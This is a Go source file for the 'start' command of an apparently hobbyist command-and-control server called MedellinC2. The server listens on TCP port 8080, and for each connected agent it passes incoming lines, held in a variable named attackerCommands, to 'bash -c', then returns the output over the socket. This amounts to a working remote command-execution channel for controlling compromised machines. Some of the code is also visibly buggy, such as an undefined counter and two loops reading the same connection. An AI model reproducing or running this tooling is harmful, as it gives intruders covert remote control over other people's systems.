/*
Copyright © 2022 NAME HERE <EMAIL ADDRESS>

*/
package cmd

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os/exec"
	"strconv"
	"strings"

	"github.com/megatop1/MedellinC2/data"
	"github.com/spf13/cobra"
)

// startCmd represents the start command
var startCmd = &cobra.Command{
	Use:   "start",
	Short: "Starts the C2 server",
	Long:  `Starts the TCP server to begin listening and handling connections agents`,
	Run: func(cmd *cobra.Command, args []string) {
		//fmt.Println("start called")
		listenForConnections()
	},
}

func init() {
	serverCmd.AddCommand(startCmd)
}

func handleConnection(c net.Conn) {
	fmt.Print("Agent successfully connected to MedellinC2 Server")
	for {
		netData, err := bufio.NewReader(c).ReadString('\n')
		if err != nil {
			fmt.Println(err)
			return
		}

		temp := strings.TrimSpace(string(netData))
		if temp == "STOP" {
			break
		}
		fmt.Println(temp)
		counter := strconv.Itoa(count) + "\n"
		c.Write([]byte(string(counter)))
	}
	c.Close()
}

func listenForConnections() {
	logo := `
	_____ ______   _______   ________  _______   ___       ___       ___  ________           ________   _______     
|\   _ \  _   \|\  ___ \ |\   ___ \|\  ___ \ |\  \     |\  \     |\  \|\   ___  \        |\   ____\ /  ___  \    
\ \  \\\__\ \  \ \   __/|\ \  \_|\ \ \   __/|\ \  \    \ \  \    \ \  \ \  \\ \  \       \ \  \___|/__/|_/  /|   
 \ \  \\|__| \  \ \  \_|/_\ \  \ \\ \ \  \_|/_\ \  \    \ \  \    \ \  \ \  \\ \  \       \ \  \   |__|//  / /   
  \ \  \    \ \  \ \  \_|\ \ \  \_\\ \ \  \_|\ \ \  \____\ \  \____\ \  \ \  \\ \  \       \ \  \____  /  /_/__  
   \ \__\    \ \__\ \_______\ \_______\ \_______\ \_______\ \_______\ \__\ \__\\ \__\       \ \_______\\________\
    \|__|     \|__|\|_______|\|_______|\|_______|\|_______|\|_______|\|__|\|__| \|__|        \|_______|\|_______|
	`
	println(logo)
	println("Medlelin C2 Server Successfully Started...")
	println("The open ports are: " + data.GetListenerPorts())
	checkListenerPorts()
	print("the length of checkListenerPorts is :")
	fmt.Println(len(checkListenerPorts()))

	l, err := net.Listen("tcp4", ":8080")

	if err != nil {
		fmt.Println(err)
		return
	}
	defer l.Close()

	for {
		connection, err := l.Accept()
		if err != nil {
			fmt.Println(err)
			return
		}
		go handleConnection(connection)
		count++

		for {
			attackerCommands, _ := bufio.NewReader(connection).ReadString('\n')
			cmd := exec.Command("bash", "-c", attackerCommands)
			if err != nil {
				log.Fatalln(err)
			}
			out, _ := cmd.CombinedOutput()

			connection.Write(out)
		}
	}

}

//Function to parse listener's ports for active listeners in the database.
func checkListenerPorts() []string {
	//use the strings.Split function to split a string into its comma separated values
	portList := strings.Split(data.GetListenerPorts(), ",")
	return portList
	//fmt.Println(portList)
}
